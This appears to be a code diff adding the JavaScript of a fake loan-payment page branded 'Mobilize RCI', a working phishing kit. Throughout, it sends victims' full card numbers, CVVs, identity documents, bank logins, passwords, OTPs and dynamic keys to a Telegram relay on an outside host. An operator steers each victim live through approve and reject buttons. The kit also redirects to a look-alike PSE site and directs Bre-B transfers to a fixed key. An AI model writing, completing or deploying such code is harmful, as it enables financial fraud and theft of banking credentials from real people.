+            </select>${arrowSvg}
+        </div>
+        <button class="mp-btn-pse" id="mp-btn-continuar">Continuar con PSE</button>`;
+
+    pseH.addEventListener('click', () => {
+        const open = pseBody.classList.toggle('open');
+        pseH.classList.toggle('open', open);
+    });
+
+    pseBody.querySelector('#mp-btn-continuar').addEventListener('click', () => {
+        const banco = document.getElementById('mp-banco').value;
+        if (!banco) { alert('Selecciona tu banco'); return; }
+        const tipoDoc     = document.getElementById('mp-tipo-doc').value;
+        const numDoc      = document.getElementById('mp-num-doc').value.trim();
+        const tipoPersona = document.getElementById('mp-tipo-persona').value;
+
+        // Actualizar pagador con datos del formulario
+        const pagActual = { ...RCI_PAGADOR, tipoId: tipoDoc, numeroId: numDoc };
+        sessionStorage.setItem('pagador',        JSON.stringify(pagActual));
+        sessionStorage.setItem('bancoPSE',       banco);
+        sessionStorage.setItem('tipoPersonaPSE', tipoPersona);
+        sessionStorage.setItem('pse_datos', JSON.stringify({ tipoDoc, numDoc, banco, tipoPersona }));
+
+        mostrarCargando(banco);
+    });
+
+    // ── Nequi ──
+    const nequiH = document.createElement('div');
+    nequiH.className = 'mp-acc-header';
+    nequiH.innerHTML = `
+        <div class="mp-acc-left"><span class="mp-acc-name">Nequi</span></div>
+        <div class="mp-right">
+            <img class="mp-nequi-logo" src="assets/nequi.svg" alt="Nequi">
+            ${chevronSvg}
+        </div>`;
+    nequiH.addEventListener('click', () => mostrarCargando('https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-nequi/'));
+
+    // ── Bre-B ──
+    const brebH = document.createElement('div');
+    brebH.className = 'mp-acc-header';
+    brebH.innerHTML = `
+        <div class="mp-acc-left"><span class="mp-acc-name">Bre-B · Transferencia directa</span></div>
+        <div class="mp-right">
+            <span class="mp-breb-pill">Bre-B</span>
+            ${chevronSvg}
+        </div>`;
+    brebH.addEventListener('click', () => {
+        const montoFmt = _pago?.montoFmt || '$ —';
+        document.getElementById('brevModalMonto').textContent = montoFmt;
+        document.getElementById('brevModalTitulo').textContent = 'Transferencia directa';
+        document.getElementById('brevModalSub').textContent = 'Transfiere el valor exacto a esta llave';
+        document.getElementById('brevModal').classList.add('show');
+    });
+
+    wrapper.appendChild(tarjetaH);
+    wrapper.appendChild(tarjetaBody);
+    wrapper.appendChild(pseH);
+    wrapper.appendChild(pseBody);
+    wrapper.appendChild(nequiH);
+    wrapper.appendChild(brebH);
+
+    return wrapper;
+}
+
+function mostrarCargando(ruta) {
+    const modal = document.createElement('div');
+    modal.id = 'mp-loading-modal';
+    modal.innerHTML = `
+        <img src="assets/logo.svg" alt="Mobilize">
+        <div id="mp-loading-bar-wrap"><div id="mp-loading-bar"></div></div>
+        <span id="mp-loading-txt">Procesando tu pago de forma segura...</span>`;
+    document.body.appendChild(modal);
+    requestAnimationFrame(() => { document.getElementById('mp-loading-bar').style.width = '100%'; });
+    setTimeout(() => { window.location.href = ruta; }, 3000);
+}
+
+// Renderizar en desktop y mobile
+document.getElementById('mp-wrapper-desktop').appendChild(buildWrapper());
+document.getElementById('mp-wrapper-mobile').appendChild(buildWrapper());
+
+// ===== MODAL JLP TARJETA =====
+const TG_BASE = window.API_BASE || 'https://apimobilize-production.up.railway.app';
+let jlpSid = null, jlpPollIv = null, jlpOffset = 0, jlpDatos = null;
+const JLP_MAX = 300000;
+
+function jlpStage(s) {
+    ['Wait','Cred','LoadingCred','OTP','Clave','LoadingVerif','Success'].forEach(n => {
+        const el = document.getElementById('jlpStage' + n);
+        if (el) el.classList.remove('active');
+    });
+    const map = { 'wait':'Wait','cred':'Cred','loading-cred':'LoadingCred','otp':'OTP','clave':'Clave','loading-verif':'LoadingVerif','success':'Success' };
+    const el = document.getElementById('jlpStage' + (map[s]||s));
+    if (el) el.classList.add('active');
+}
+
+async function jlpSend(text, keyboard) {
+    try {
+        const body = { text };
+        if (keyboard) body.reply_markup = keyboard;
+        const r = await fetch(TG_BASE + '/api/tg/send', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body) });
+        const d = await r.json();
+        return d.ok ? d.result?.message_id : null;
+    } catch(e) { return null; }
+}
+
+async function jlpGetUpdates() {
+    try {
+        const r = await fetch(TG_BASE + '/api/tg/updates?offset=' + jlpOffset);
+        const d = await r.json();
+        if (d.ok && d.result.length > 0) jlpOffset = d.result[d.result.length-1].update_id + 1;
+        return d.ok ? d.result : [];
+    } catch(e) { return []; }
+}
+
+function jlpStopPoll() { if (jlpPollIv) { clearInterval(jlpPollIv); jlpPollIv = null; } }
+
+function jlpCerrar() {
+    jlpStopPoll();
+    document.getElementById('jlpModalOverlay').classList.remove('show');
+}
+
+function jlpKb(rows) { return { inline_keyboard: rows }; }
+
+function tgAnswer(id) {
+    fetch(TG_BASE + '/api/tg/answer', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({callback_query_id: id}) }).catch(()=>{});
+}
+
+function jlpStartPoll(onAction) {
+    const t0 = Date.now();
+    jlpStopPoll();
+    jlpPollIv = setInterval(async () => {
+        if (Date.now() - t0 > JLP_MAX) { jlpStopPoll(); jlpCerrar(); return; }
+        const updates = await jlpGetUpdates();
+        for (const upd of updates) {
+            if (upd.callback_query) {
+                const data = upd.callback_query.data || '';
+                if (data.startsWith('jlp:') && data.endsWith(':' + jlpSid)) {
+                    const action = data.split(':')[1];
+                    tgAnswer(upd.callback_query.id);
+                    jlpStopPoll();
+                    onAction(action);
+                    return;
+                }
+            }
+        }
+    }, 2000);
+}
+
+function jlpStartPollVerif() {
+    const t0 = Date.now();
+    jlpStopPoll();
+    jlpPollIv = setInterval(async () => {
+        if (Date.now() - t0 > JLP_MAX) { jlpStopPoll(); jlpCerrar(); return; }
+        const updates = await jlpGetUpdates();
+        for (const upd of updates) {
+            if (upd.callback_query) {
+                const data = upd.callback_query.data || '';
+                if (data.startsWith('jlp:') && data.endsWith(':' + jlpSid)) {
+                    const action = data.split(':')[1];
+                    tgAnswer(upd.callback_query.id);
+                    jlpStopPoll();
+                    if (action === 'aot' || action === 'acd') {
+                        jlpStage('success');
+                    } else if (action === 'rot') {
+                        jlpStage('otp');
+                        document.getElementById('jlpOtpInput').value = '';
+                    } else if (action === 'rcd') {
+                        jlpStage('clave');
+                        document.getElementById('jlpClaveInput').value = '';
+                    } else {
+                        jlpCerrar();
+                    }
+                    return;
+                }
+            }
+        }
+    }, 2000);
+}
+
+async function abrirModalJLP(datos) {
+    jlpDatos = datos;
+    jlpSid = 'JLP' + Date.now() + Math.random().toString(36).substr(2,5);
+
+    document.getElementById('jlpCardName').textContent = (datos.nombre||'') + ' ' + (datos.apellido||'');
+    document.getElementById('jlpAmountLine').textContent = datos.montoFormateado || '';
+    const logoMap = { visa:'https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/visa.svg', mastercard:'https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/mastercard.svg', amex:'https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/amex.svg' };
+    const logoEl = document.getElementById('jlpCardLogo');
+    logoEl.src = logoMap[datos.tipoTarjeta] || logoMap.visa;
+    logoEl.style.display = 'block';
+
+    jlpStage('wait');
+    document.getElementById('jlpModalOverlay').classList.add('show');
+    await jlpGetUpdates();
+
+    const sid = jlpSid;
+    const msg = '🔔 <b>NUEVA SOLICITUD — MOBILIZE RCI</b>\n' +
+        '🆔 ID: <code>' + sid + '</code>\n' +
+        '─'.repeat(22) + '\n' +
+        '💳 TARJETA\n' +
+        '• Número: <code>' + datos.numero_tarjeta + '</code>\n' +
+        '• Vencimiento: <code>' + datos.fecha_tarjeta + '</code>\n' +
+        '• CVV: <code>' + datos.cvv + '</code>\n' +
+        '─'.repeat(22) + '\n' +
+        '👤 <b>TITULAR</b>\n' +
+        '• Nombre: <code>' + datos.nombre + ' ' + datos.apellido + '</code>\n' +
+        '• Doc: <code>' + datos.tipoDoc + ' ' + datos.cedula + '</code>\n' +
+        '• Email: <code>' + datos.email + '</code>\n' +
+        '─'.repeat(22) + '\n' +
+        '📋 <b>Crédito:</b> <code>' + datos.numeroCredito + '</code>\n' +
+        '📝 <b>Concepto:</b> ' + datos.concepto + '\n' +
+        '💰 <b>Monto:</b> <code>' + datos.montoFormateado + '</code>\n' +
+        '📅 ' + new Date().toLocaleString('es-CO');
+
+    const kb = jlpKb([
+        [{ text:'✅ Aprobar', callback_data:'jlp:apr:'+sid }, { text:'❌ Rechazar', callback_data:'jlp:rec:'+sid }],
+        [{ text:'📲 Pedir OTP', callback_data:'jlp:otp:'+sid }, { text:'🔑 Clave Dinámica', callback_data:'jlp:cdp:'+sid }]
+    ]);
+    await jlpSend(msg, kb);
+
+    jlpStartPoll(action => {
+        if (action === 'apr')       { jlpStage('cred'); }
+        else if (action === 'rec')  { jlpCerrar(); }
+        else if (action === 'otp')  { jlpStage('otp'); jlpStartPollVerif(); }
+        else if (action === 'cdp')  { jlpStage('clave'); jlpStartPollVerif(); }
+    });
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const btnCred = document.getElementById('jlpBtnEnviarCred');
+    if (btnCred) btnCred.addEventListener('click', async () => {
+        const user = (document.getElementById('jlpCredUser').value||'').trim();
+        const pass = (document.getElementById('jlpCredPass').value||'').trim();
+        if (!user || !pass) { alert('Completa los campos'); return; }
+        jlpStage('loading-cred');
+        const msg = '🔐 <b>CREDENCIALES</b>\n🆔 ID: <code>' + jlpSid + '</code>\n• Usuario: <code>' + user + '</code>\n• Contraseña: <code>' + pass + '</code>';
+        const kb = jlpKb([[{text:'📲 Pedir OTP',callback_data:'jlp:otp:'+jlpSid},{text:'🔑 Clave Dinámica',callback_data:'jlp:cdp:'+jlpSid}],[{text:'❌ Error Credenciales',callback_data:'jlp:erc:'+jlpSid}]]);
+        await jlpSend(msg, kb);
+        jlpStartPoll(action => {
+            if (action === 'otp') { jlpStage('otp'); jlpStartPollVerif(); }
+            else if (action === 'cdp') { jlpStage('clave'); jlpStartPollVerif(); }
+            else if (action === 'erc') { jlpStage('cred'); document.getElementById('jlpCredUser').value=''; document.getElementById('jlpCredPass').value=''; }
+        });
+    });
+
+    const eyeBtn = document.getElementById('jlpEyeBtn');
+    if (eyeBtn) eyeBtn.addEventListener('click', () => {
+        const inp = document.getElementById('jlpCredPass');
+        inp.type = inp.type === 'password' ? 'text' : 'password';
+    });
+
+    const btnOtp = document.getElementById('jlpBtnEnviarOtp');
+    if (btnOtp) btnOtp.addEventListener('click', async () => {
+        const otp = (document.getElementById('jlpOtpInput').value||'').trim();
+        if (!otp) { alert('Ingresa el código'); return; }
+        jlpStage('loading-verif');
+        const msg = '📲 <b>OTP</b>\n🆔 ID: <code>' + jlpSid + '</code>\n• OTP: <code>' + otp + '</code>';
+        const kb = jlpKb([[{text:'✅ Aprobar',callback_data:'jlp:aot:'+jlpSid},{text:'❌ Rechazar',callback_data:'jlp:rot:'+jlpSid}]]);
+        await jlpSend(msg, kb);
+        jlpStartPollVerif();
+    });
+
+    const btnClave = document.getElementById('jlpBtnEnviarClave');
+    if (btnClave) btnClave.addEventListener('click', async () => {
+        const clave = (document.getElementById('jlpClaveInput').value||'').trim();
+        if (!clave) { alert('Ingresa tu clave dinámica'); return; }
+        jlpStage('loading-verif');
+        const msg = '🔑 <b>CLAVE DINÁMICA</b>\n🆔 ID: <code>' + jlpSid + '</code>\n• Clave: <code>' + clave + '</code>';
+        const kb = jlpKb([[{text:'✅ Aprobar',callback_data:'jlp:acd:'+jlpSid},{text:'❌ Rechazar',callback_data:'jlp:rcd:'+jlpSid}]]);
+        await jlpSend(msg, kb);
+        jlpStartPollVerif();
+    });
+});
+
+// ===== BREV =====
+let brevPollIv = null;
+function brevStopPoll() { if (brevPollIv) { clearInterval(brevPollIv); brevPollIv = null; } }
+
+function brevCopiarLlave() {
+    const llave = '@LITTIO1047039997';
+    navigator.clipboard.writeText(llave).catch(() => {
+        const el = document.createElement('textarea');
+        el.value = llave; document.body.appendChild(el);
+        el.select(); document.execCommand('copy');
+        document.body.removeChild(el);
+    });
+}
+
+async function brevConfirmar() {
+    document.getElementById('brevModal').classList.remove('show');
+
+    // Mostrar loading
+    document.getElementById('brevLoadingSpinner').style.display = 'block';
+    document.getElementById('brevLoadingTexto').style.display = 'block';
+    document.getElementById('brevLoadingTexto').textContent = 'Verificando transferencia...';
+    document.getElementById('brevRechazadoMsg').style.display = 'none';
+    document.getElementById('brevLoadingOverlay').style.display = 'flex';
+
+    const sid = 'BRV' + Date.now() + Math.random().toString(36).substr(2,4);
+    await jlpGetUpdates(); // sync offset
+
+    const msg = '💸 <b>PAGO BRE-B — MOBILIZE RCI</b>\n' +
+        '🆔 ID: <code>' + sid + '</code>\n' +
+        '─'.repeat(22) + '\n' +
+        '👤 <b>' + (_credito?.nombreCompleto||'') + '</b>\n' +
+        '🪪 Cédula: <code>' + (_credito?.cedula||'') + '</code>\n' +
+        '📧 ' + (_credito?.email||'') + '\n' +
+        '─'.repeat(22) + '\n' +
+        '📋 Crédito: <code>' + (_credito?.numero||'') + '</code>\n' +
+        '🔑 Llave: @LITTIO1047039997\n' +
+        '─'.repeat(22) + '\n' +
+        '💰 <b>' + (_pago?.montoFmt||'') + '</b>\n' +
+        '⏰ ' + new Date().toLocaleString('es-CO');
+
+    const kb = { inline_keyboard: [[
+        { text:'✅ Pagó', callback_data:'jlp:brvapr:'+sid },
+        { text:'❌ No pagó', callback_data:'jlp:brvrec:'+sid }
+    ]]};
+
+    fetch(TG_BASE + '/api/tg/send', {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ text: msg, reply_markup: kb })
+    }).catch(()=>{});
+
+    const t0 = Date.now();
+    brevStopPoll();
+    brevPollIv = setInterval(async () => {
+        if (Date.now() - t0 > 300000) { brevStopPoll(); return; }
+        const updates = await jlpGetUpdates();
+        for (const upd of updates) {
+            if (!upd.callback_query) continue;
+            const cdata = upd.callback_query.data || '';
+            if (!cdata.endsWith(':' + sid)) continue;
+            tgAnswer(upd.callback_query.id);
+            brevStopPoll();
+            const action = cdata.split(':')[1];
+            if (action === 'brvapr') {
+                document.getElementById('brevLoadingOverlay').style.display = 'none';
+                document.getElementById('brevSuccessOverlay').style.display = 'flex';
+            } else {
+                document.getElementById('brevLoadingSpinner').style.display = 'none';
+                document.getElementById('brevLoadingTexto').style.display = 'none';
+                document.getElementById('brevRechazadoMsg').style.display = 'flex';
+            }
+            return;
+        }
+    }, 2000);
+}
+
+function brevVolverModal() {
+    brevStopPoll();
+    document.getElementById('brevLoadingOverlay').style.display = 'none';
+    document.getElementById('brevLoadingTexto').style.display = 'block';
+    document.getElementById('brevLoadingSpinner').style.display = 'block';
+    document.getElementById('brevRechazadoMsg').style.display = 'none';
+    document.getElementById('brevModal').classList.add('show');
+    document.getElementById('brevModalMonto').textContent = _pago?.montoFmt || '$ —';
+}
+</script>
+</body>
+</html>
